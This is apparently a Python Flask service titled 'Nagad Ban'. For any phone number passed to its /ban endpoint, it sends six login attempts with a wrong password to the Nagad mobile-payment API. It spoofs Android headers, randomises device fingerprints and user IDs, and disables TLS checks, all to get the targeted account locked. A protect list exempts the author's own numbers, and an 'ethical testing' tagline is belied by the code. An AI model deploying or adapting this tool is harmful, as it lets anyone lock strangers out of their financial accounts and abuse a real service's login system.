from flask import Flask, request, jsonify
import requests
import time
import json
import random
import string

app = Flask(__name__)
requests.packages.urllib3.disable_warnings()

NAGAD_URL = "https://app2.mynagad.com:20002/api/login"
NAGAD_PASSWORD = "B3282A2F2A28757B3A18AB833DE16A9C54518C0B0CF493E3F0A7CF09386F326A"

PROTECT = ["01733772711", "01988526736"]

BRANDING = {
    "team": "⚡ YOUR TEAM NAME ⚡",
    "message": "Message: Target Activated — Login Attempted (6x)",
    "tagline": "Ethical security testing only.",
}

LOOP = 6

def normalize_num(raw):
    digits = "".join(ch for ch in raw if ch.isdigit())
    if len(digits) < 11:
        return None
    return digits[-11:]

def is_protected(num):
    for p in PROTECT:
        pd = p if isinstance(p, str) else str(p)
        if pd == num or pd[-11:] == num:
            return True
    return False

def generate_device_fgp():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=64))

def build_payload(username):
    return {
        "aspId": "100012345612345",
        "mpaId": None,
        "password": NAGAD_PASSWORD,
        "username": username,
    }

def nagad_ban(username, loop=LOOP):
    attempts = []
    for i in range(1, loop + 1):
        dynamic_headers = {
            "Host": "app2.mynagad.com:20002",
            "User-Agent": "okhttp/5.0.0-alpha.7",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "X-KM-UserId": str(random.randint(10000000, 99999999)),
            "X-KM-User-AspId": "100012345612345",
            "X-KM-User-Agent": "ANDROID/1220",
            "X-KM-DEVICE-FGP": generate_device_fgp(),
            "X-KM-Accept-language": "bn",
            "X-KM-AppCode": "01",
            "Content-Type": "application/json; charset=UTF-8",
        }

        try:
            r = requests.post(NAGAD_URL, headers=dynamic_headers,
                              json=build_payload(username),
                              timeout=12, verify=False)
            
            try:
                res_json = r.json()
                masked_response = json.dumps(res_json, separators=(',', ':'), ensure_ascii=False)
            except:
                masked_response = json.dumps({"raw_response": r.text[:400]}, separators=(',', ':'), ensure_ascii=False)

            attempts.append({
                "attempt": i, 
                "status": r.status_code,
                "response": masked_response
            })
        except Exception as e:
            err_masked = json.dumps({"error": str(e)[:150]}, separators=(',', ':'), ensure_ascii=False)
            attempts.append({
                "attempt": i, 
                "status": None,
                "response": err_masked
            })
        
        if i < loop:
            time.sleep(0.5)
            
    return attempts

@app.route("/ban", methods=["GET"])
def ban():
    raw = request.args.get("num", "").strip()
    num = normalize_num(raw)
    if not num:
        return jsonify({"success": False, "error": "Invalid number. Use /ban?num=01313613360"}), 400

    if is_protected(num):
        return jsonify({
            "success": False,
            "blocked": True,
            "message": "⛔ এই নম্বরটি protect list-এ আছে — request পাঠানো হয়নি।",
            "protect_list": PROTECT,
            "custom": "এই নম্বরটি সুরক্ষিত, এটা বাদ দিন।",
        }), 403

    attempts = nagad_ban(num)

    return jsonify({
        "success": True,
        "target": num,
        "loop": LOOP,
        "login_attempts": attempts,
        "branding": BRANDING,
    })

@app.route("/", methods=["GET"])
def index():
    return jsonify({
        "app": "Nagad Ban Render Ready",
        "usage": "/ban?num=01313613360",
        "protected_count": len(PROTECT),
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
